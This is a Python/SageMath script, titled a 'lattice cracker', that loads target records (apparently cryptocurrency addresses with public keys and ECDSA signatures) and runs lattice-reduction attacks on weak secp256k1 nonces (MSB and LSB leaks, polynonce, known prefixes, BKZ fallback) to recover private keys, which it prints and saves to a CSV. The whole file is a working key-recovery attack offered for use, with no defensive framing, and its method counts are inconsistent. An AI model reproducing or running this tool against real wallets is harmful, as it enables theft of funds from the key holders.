import json
import os
import csv
from sage.all import *

N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def verify_key(pub_hex, priv_int):
    priv_int = int(priv_int)
    if priv_int <= 0 or priv_int >= N: return False
    try:
        import ecdsa
        from ecdsa import SECP256k1 as curve
        sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
        vk = sk.verifying_key
        pt = vk.pubkey.point
        x_bytes = int(pt.x()).to_bytes(int(32), 'big')
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            y_bytes = int(pt.y()).to_bytes(int(32), 'big')
            generated_pub = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
            generated_pub = (prefix + x_bytes).hex()
        return generated_pub == pub_hex.lower()
    except Exception:
        return False

# ==============================================================================
# METHOD 1: MSB (Most Significant Bit) Leak Matrix
# Catches: Weak RNG where top bits of nonce K are zero (K < 2^(256-leak))
# ==============================================================================
def solve_msb(pub, sigs, leaked_bits, use_bkz=False):
    num_sigs = len(sigs)
    B = 2 ** (256 - leaked_bits)
    
    dim = num_sigs + 2
    M = Matrix(QQ, dim, dim)
    
    for i in range(num_sigs):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        try:
            s_inv = int(inverse_mod(s_i, N))
        except ValueError:
            return None
        t_i = (r_i * s_inv) % N
        u_i = (z_i * s_inv - (B // 2)) % N
        M[i, i] = N
        M[num_sigs, i] = t_i
        M[num_sigs + 1, i] = u_i
    M[num_sigs, num_sigs] = QQ(B) / QQ(N)
    M[num_sigs + 1, num_sigs + 1] = B
    
    if use_bkz:
        M_reduced = M.BKZ(block_size=int(25))
    else:
        M_reduced = M.LLL()
    
    for row in M_reduced:
        val = row[num_sigs]
        possible_d = int(val * N / B) % N
        if verify_key(pub, possible_d): return possible_d
        neg_d = (-possible_d) % N
        if verify_key(pub, neg_d): return neg_d
    return None

# ==============================================================================
# METHOD 2: LSB (Least Significant Bit) Leak Matrix
# Catches: Bugs where bottom bits of nonce K are zero (K divisible by 2^leak)
# K = K_high * 2^leak, so we substitute and solve for K_high
# ==============================================================================
def solve_lsb(pub, sigs, leaked_bits, use_bkz=False):
    num_sigs = len(sigs)
    shift = 2 ** leaked_bits
    B = 2 ** (256 - leaked_bits)
    
    dim = num_sigs + 2
    M = Matrix(QQ, dim, dim)
    
    for i in range(num_sigs):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        try:
            s_shift_inv = int(inverse_mod((s_i * shift) % N, N))
        except ValueError:
            return None
        t_i = (r_i * s_shift_inv) % N
        u_i = (z_i * s_shift_inv - (B // 2)) % N
        M[i, i] = N
        M[num_sigs, i] = t_i
        M[num_sigs + 1, i] = u_i
    M[num_sigs, num_sigs] = QQ(B) / QQ(N)
    M[num_sigs + 1, num_sigs + 1] = B
    
    if use_bkz:
        M_reduced = M.BKZ(block_size=int(25))
    else:
        M_reduced = M.LLL()
    
    for row in M_reduced:
        val = row[num_sigs]
        possible_d = int(val * N / B) % N
        if verify_key(pub, possible_d): return possible_d
        neg_d = (-possible_d) % N
        if verify_key(pub, neg_d): return neg_d
    return None

# ==============================================================================
# METHOD 3: Dario Clavijo Differential Polynonce Matrix
# Catches: Nonces that share polynomial/linear relationships
# Uses last signature as reference and computes nonce DIFFERENCES
# ==============================================================================
def solve_polynonce(pub, sigs, B_bits, use_bkz=False):
    msgs = [int(s['z'], 16) for s in sigs]
    sig_pairs = [(int(s['r'], 16), int(s['s'], 16)) for s in sigs]
    m = len(msgs)
    
    msgn, rn, sn = msgs[-1], sig_pairs[-1][0], sig_pairs[-1][1]
    rnsn_inv = rn * int(inverse_mod(sn, N))
    mnsn_inv = msgn * int(inverse_mod(sn, N))
    
    matrix = Matrix(QQ, m + 2, m + 2)
    for i in range(m):
        matrix[i, i] = N
    for i in range(m):
        si_inv = int(inverse_mod(sig_pairs[i][1], N))
        x0 = (sig_pairs[i][0] * si_inv) - rnsn_inv
        x1 = (msgs[i] * si_inv) - mnsn_inv
        matrix[m, i] = x0
        matrix[m + 1, i] = x1
    matrix[m, m] = QQ(int(2**B_bits)) / QQ(N)
    matrix[m, m + 1] = 0
    matrix[m + 1, m] = 0
    matrix[m + 1, m + 1] = int(2**B_bits)
    
    if use_bkz:
        new_matrix = matrix.BKZ(block_size=int(25))
    else:
        new_matrix = matrix.LLL(early_red=True, use_siegel=True)
    
    for row in new_matrix:
        potential_nonce_diff = row[0]
        potential_priv_key = (sn * msgs[0]) - (sig_pairs[0][1] * msgn) - (sig_pairs[0][1] * sn * potential_nonce_diff)
        try:
            potential_priv_key *= int(inverse_mod(int((rn * sig_pairs[0][1]) - (sig_pairs[0][0] * sn)), N))
            key = int(potential_priv_key) % N
            if verify_key(pub, key): return key
        except Exception:
            pass
    return None

# ==============================================================================
# METHOD 4: Known-Prefix Nonce Attack
# Catches: Wallets that used timestamps/counters as nonce prefix
# Tests common fixed prefixes (0x00000000, 0xFFFFFFFF, low entropy patterns)
# ==============================================================================
def solve_known_prefix(pub, sigs, prefix_bits, prefix_val, use_bkz=False):
    num_sigs = min(len(sigs), 60)
    remaining_bits = 256 - prefix_bits
    B = 2 ** remaining_bits
    
    dim = num_sigs + 2
    M = Matrix(QQ, dim, dim)
    
    known_part = prefix_val * (2 ** remaining_bits)
    
    for i in range(num_sigs):
        r_i = int(sigs[i]['r'], 16)
        s_i = int(sigs[i]['s'], 16)
        z_i = int(sigs[i]['z'], 16)
        try:
            s_inv = int(inverse_mod(s_i, N))
        except ValueError:
            return None
        t_i = (r_i * s_inv) % N
        # Subtract the known prefix contribution from the hash equation
        u_i = ((z_i - r_i * s_inv * 0 + s_i * s_inv * known_part) * s_inv - (B // 2)) % N
        u_i = (z_i * s_inv + known_part * s_inv - (B // 2)) % N
        M[i, i] = N
        M[num_sigs, i] = t_i
        M[num_sigs + 1, i] = u_i
    M[num_sigs, num_sigs] = QQ(B) / QQ(N)
    M[num_sigs + 1, num_sigs + 1] = B
    
    if use_bkz:
        M_reduced = M.BKZ(block_size=int(25))
    else:
        M_reduced = M.LLL()
    
    for row in M_reduced:
        val = row[num_sigs]
        possible_d = int(val * N / B) % N
        if verify_key(pub, possible_d): return possible_d
        neg_d = (-possible_d) % N
        if verify_key(pub, neg_d): return neg_d
    return None

# ==============================================================================
# MAIN
# ==============================================================================
def main():
    print("===================================================================")
    print("   LATTICE CRACKER v4.0 - FULL ARSENAL (5 METHODS + BKZ FALLBACK) ")
    print("===================================================================")
    
    targets = []
    target_dir = "reports/pass"
    if not os.path.isdir(target_dir):
        print(f"[!] Directory not found: {target_dir}")
        print("[!] Run python lattice_analyzer.py first.")
        return
    for filename in os.listdir(target_dir):
        if filename.endswith(".json"):
            with open(os.path.join(target_dir, filename), "r") as f:
                data = json.load(f)
                if isinstance(data, dict):
                    if 'address' not in data: data['address'] = filename.replace('.json', '')
                    targets.append(data)
                elif isinstance(data, list): targets.extend(data)
    if not targets:
        print("[!] No targets found! Run python lattice_analyzer.py first.")
        return
    
    # Deduplicate targets by address
    seen_addrs = set()
    unique_targets = []
    for t in targets:
        addr = t.get('address', '')
        if addr not in seen_addrs:
            seen_addrs.add(addr)
            unique_targets.append(t)
    targets = unique_targets
        
    print(f"\n[*] Detected {len(targets)} unique targets. Starting full arsenal scan...\n")
    recovered_keys = []
    
    bit_tests = [128, 96, 64, 48, 32, 24, 16, 8, 7, 6, 5, 4]
    
    # Polynonce B-value tests
    poly_tests = [
        (249, 79,  "Polynonce 249-bit (79 sigs)"),
        (240, 60,  "Polynonce 240-bit (60 sigs)"),
        (200, 50,  "Polynonce 200-bit (50 sigs)"),
        (160, 40,  "Polynonce 160-bit (40 sigs)"),
        (128, 30,  "Polynonce 128-bit (30 sigs)"),
        (100, 20,  "Polynonce 100-bit (20 sigs)"),
        (64,  15,  "Polynonce 64-bit (15 sigs)"),
    ]
    
    # Known prefix patterns
    prefix_tests = [
        (32, 0x00000000, "Zero Prefix (32-bit)"),
        (32, 0xFFFFFFFF, "FF Prefix (32-bit)"),
        (16, 0x0000,     "Zero Prefix (16-bit)"),
        (16, 0xFFFF,     "FF Prefix (16-bit)"),
        (8,  0x00,       "Zero Prefix (8-bit)"),
    ]
    
    for data in targets:
        address = data.get('address', 'Unknown')
        pub = data.get('pubkey', 'Unknown')
        sigs = list(data.get('signatures', []))
        fingerprints = data.get('historic_fingerprints', [])
        
        if len(sigs) < 4: continue
            
        print(f"{'='*70}")
        print(f"[*] Target: {address} (Pubkey: {pub[:16]}...)")
        print(f"[*] Total signatures available: {len(sigs)}")
        if fingerprints:
            print("  -> " + "\n  -> ".join(fingerprints))
        
        success = False
        sorted_sigs = sorted(sigs, key=lambda x: int(x['z'], 16))
        
        # ============ PHASE 1: MSB LEAK (LLL) ============
        print(f"\n[PHASE 1] MSB Leak Scan (LLL) - {len(bit_tests)} tests...")
        for bits in bit_tests:
            req = min(120, max(10, int((256 / bits) * 3)))
            if len(sorted_sigs) < req:
                print(f"  -> Skip MSB {bits}-bit: need {req} sigs")
                continue
            print(f"  -> MSB {bits}-bit using {req} sigs...", end="", flush=True)
            d = solve_msb(pub, sorted_sigs[:req], bits)
            if d:
                print(f" CRACKED!")
                success = True
                recovered_keys.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"MSB {bits}-bit Leak (LLL)", "bits": bits})
                break
            print(" miss")
        
        # ============ PHASE 2: LSB LEAK (LLL) ============
        if not success:
            print(f"\n[PHASE 2] LSB Leak Scan (LLL) - {len(bit_tests)} tests...")
            for bits in bit_tests:
                req = min(120, max(10, int((256 / bits) * 3)))
                if len(sorted_sigs) < req:
                    print(f"  -> Skip LSB {bits}-bit: need {req} sigs")
                    continue
                print(f"  -> LSB {bits}-bit using {req} sigs...", end="", flush=True)
                d = solve_lsb(pub, sorted_sigs[:req], bits)
                if d:
                    print(f" CRACKED!")
                    success = True
                    recovered_keys.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"LSB {bits}-bit Leak (LLL)", "bits": bits})
                    break
                print(" miss")
        
        # ============ PHASE 3: POLYNONCE (LLL) ============
        if not success:
            print(f"\n[PHASE 3] Polynonce Differential Scan (LLL) - {len(poly_tests)} tests...")
            for B_bits, num_sigs, name in poly_tests:
                if len(sigs) < num_sigs:
                    print(f"  -> Skip {name}: need {num_sigs} sigs")
                    continue
                print(f"  -> {name} (B={B_bits})...", end="", flush=True)
                d = solve_polynonce(pub, sigs[:num_sigs], B_bits)
                if d:
                    print(f" CRACKED!")
                    success = True
                    recovered_keys.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"{name} (LLL)", "bits": B_bits})
                    break
                print(" miss")
        
        # ============ PHASE 4: KNOWN-PREFIX NONCE ============
        if not success:
            print(f"\n[PHASE 4] Known-Prefix Nonce Scan - {len(prefix_tests)} patterns...")
            for prefix_bits, prefix_val, name in prefix_tests:
                req = min(60, max(10, int((256 / (256 - prefix_bits)) * 3)))
                if len(sorted_sigs) < req:
                    continue
                print(f"  -> {name} using {req} sigs...", end="", flush=True)
                d = solve_known_prefix(pub, sorted_sigs[:req], prefix_bits, prefix_val)
                if d:
                    print(f" CRACKED!")
                    success = True
                    recovered_keys.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"Known-Prefix: {name}", "bits": prefix_bits})
                    break
                print(" miss")
        
        # ============ PHASE 5: BKZ FALLBACK (stronger reduction) ============
        if not success and len(sigs) >= 15:
            print(f"\n[PHASE 5] BKZ Deep Reduction Fallback (slower but stronger)...")
            
            # BKZ on MSB (test key sizes only)
            for bits in [128, 64, 32, 16, 8]:
                req = min(60, max(10, int((256 / bits) * 2)))
                if len(sorted_sigs) < req: continue
                print(f"  -> BKZ MSB {bits}-bit using {req} sigs...", end="", flush=True)
                d = solve_msb(pub, sorted_sigs[:req], bits, use_bkz=True)
                if d:
                    print(f" CRACKED!")
                    success = True
                    recovered_keys.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"MSB {bits}-bit Leak (BKZ)", "bits": bits})
                    break
                print(" miss")
            
            # BKZ on LSB
            if not success:
                for bits in [128, 64, 32, 16, 8]:
                    req = min(60, max(10, int((256 / bits) * 2)))
                    if len(sorted_sigs) < req: continue
                    print(f"  -> BKZ LSB {bits}-bit using {req} sigs...", end="", flush=True)
                    d = solve_lsb(pub, sorted_sigs[:req], bits, use_bkz=True)
                    if d:
                        print(f" CRACKED!")
                        success = True
                        recovered_keys.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"LSB {bits}-bit Leak (BKZ)", "bits": bits})
                        break
                    print(" miss")
            
            # BKZ on Polynonce
            if not success:
                for B_bits, num_sigs, name in poly_tests[:4]:
                    if len(sigs) < num_sigs: continue
                    print(f"  -> BKZ {name}...", end="", flush=True)
                    d = solve_polynonce(pub, sigs[:num_sigs], B_bits, use_bkz=True)
                    if d:
                        print(f" CRACKED!")
                        success = True
                        recovered_keys.append({"address": address, "pub": pub, "priv": hex(d), "bug": f"{name} (BKZ)", "bits": B_bits})
                        break
                    print(" miss")
        
        # ============ RESULT ============
        if success:
            k = recovered_keys[-1]
            print("\n" + "!"*70)
            print(f"   [SUCCESS] VULNERABILITY DETECTED!")
            print(f"   METHOD:  {k['bug']}")
            print(f"   ADDRESS: {address}")
            print(f"   KEY:     {k['priv']}")
            print("!"*70)
        else:
            print(f"\n   [FAILED] All 6 methods exhausted. No vulnerability found.")
            
    # Save results
    if recovered_keys:
        out_csv = "LATTICE_RECOVERED_KEYS.csv"
        with open(out_csv, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Address", "Public Key", "Private Key Hex", "Detected Bug", "Bit Parameter"])
            for row in recovered_keys:
                w.writerow([row['address'], row['pub'], row['priv'], row['bug'], row['bits']])
        print(f"\n[+] Saved {len(recovered_keys)} recovered keys to {out_csv}")
    else:
        print("\n[-] No keys recovered.")

if __name__ == "__main__":
    main()
